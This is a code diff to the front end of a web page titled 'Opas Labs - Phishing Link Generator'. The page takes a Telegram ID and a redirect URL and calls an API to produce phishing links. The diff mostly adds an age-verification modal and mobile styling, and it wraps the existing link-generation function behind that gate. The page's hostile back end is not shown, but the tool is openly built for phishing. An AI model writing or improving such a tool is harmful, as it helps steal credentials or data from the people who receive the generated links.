@@ -2,6 +2,7 @@
 <html>
 <head>
   <title>Opas Labs - Phishing Link Generator</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
   <style>
     :root {
@@ -179,6 +180,65 @@
       text-decoration: underline;
       color: #00c8ff;
     }
+    
+    /* Age Verification Modal */
+    .age-modal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(7, 10, 21, 0.95);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+      backdrop-filter: blur(10px);
+    }
+    .age-modal-content {
+      background: rgba(12, 16, 33, 0.95);
+      padding: 2rem;
+      border-radius: 15px;
+      max-width: 500px;
+      width: 90%;
+      text-align: center;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+    }
+    .age-modal h2 {
+      color: var(--accent);
+      margin-bottom: 1rem;
+      font-size: 1.8rem;
+    }
+    .age-modal p {
+      margin-bottom: 2rem;
+      color: rgba(255, 255, 255, 0.8);
+    }
+    .age-btn-group {
+      display: flex;
+      gap: 1rem;
+      justify-content: center;
+      flex-wrap: wrap;
+    }
+    .age-btn {
+      padding: 0.8rem 1.5rem;
+      border-radius: 8px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: var(--transition);
+      min-width: 120px;
+    }
+    .age-btn.underage {
+      background: linear-gradient(90deg, #f44336, #d32f2f);
+    }
+    .age-btn.adult {
+      background: linear-gradient(90deg, #4CAF50, #2E7D32);
+    }
+    .age-btn:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+    }
+    
     @keyframes rotate {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
@@ -191,10 +251,53 @@
       .logo h1 {
         font-size: 2rem;
       }
+      .age-modal-content {
+        padding: 1.5rem;
+      }
+      .age-btn-group {
+        flex-direction: column;
+        gap: 0.8rem;
+      }
+      .age-btn {
+        width: 100%;
+      }
+    }
+    @media (max-width: 480px) {
+      .container {
+        margin: 1rem;
+        padding: 1rem;
+      }
+      .logo h1 {
+        font-size: 1.8rem;
+      }
+      input[type="text"],
+      input[type="url"] {
+        padding: 0.8rem 0.6rem 0.8rem 2.5rem;
+      }
+      .input-group i {
+        font-size: 1rem;
+        left: 12px;
+      }
     }
   </style>
 </head>
 <body>
+  <!-- Age Verification Modal -->
+  <div id="ageModal" class="age-modal">
+    <div class="age-modal-content">
+      <h2><i class="fas fa-exclamation-triangle"></i> Age Verification</h2>
+      <p>This tool is intended for adults only. By entering, you confirm that you are 18 years of age or older.</p>
+      <div class="age-btn-group">
+        <button class="age-btn underage" id="underageBtn">
+          <i class="fas fa-child"></i> I'm Under 18
+        </button>
+        <button class="age-btn adult" id="adultBtn">
+          <i class="fas fa-user-check"></i> I'm 18 or Older
+        </button>
+      </div>
+    </div>
+  </div>
+
   <canvas id="particles" class="particles"></canvas>
   <div class="container">
     <div class="logo">
@@ -310,8 +413,14 @@
     initParticles();
     animateParticles();
 
-    // Original Link Generator Logic (API call)
-    document.getElementById('generateBtn').addEventListener('click', async () => {
+    // Age Verification Logic
+    const ageModal = document.getElementById('ageModal');
+    const underageBtn = document.getElementById('underageBtn');
+    const adultBtn = document.getElementById('adultBtn');
+    const generateBtn = document.getElementById('generateBtn');
+
+    // Original Link Generator Logic (wrapped in function)
+    async function generateLink() {
       const telegramId = document.getElementById('telegramId').value.trim();
       const redirectUrl = document.getElementById('redirectUrl').value.trim() || 'https://google.com';
       
@@ -339,6 +448,30 @@
       } finally {
         document.getElementById('generateBtn').innerHTML = '<i class="fas fa-bolt"></i> Generate Link';
       }
+    }
+
+    // Modified Generate Button Click Handler
+    generateBtn.addEventListener('click', function(e) {
+      // Check if already verified
+      if(localStorage.getItem('ageVerified') === 'true') {
+        generateLink();
+      } else {
+        // Show age verification modal
+        e.preventDefault();
+        ageModal.style.display = 'flex';
+      }
+    });
+
+    // Handle underage button
+    underageBtn.addEventListener('click', function() {
+      window.location.href = 'https://youtu.be/020g-0hhCAU?si=H64NYyVaQsrjHh2V';
+    });
+
+    // Handle adult button
+    adultBtn.addEventListener('click', function() {
+      localStorage.setItem('ageVerified', 'true');
+      ageModal.style.display = 'none';
+      generateLink(); // Proceed with generation after verification
     });
     
     document.getElementById('copyBtn').addEventListener('click', () => {
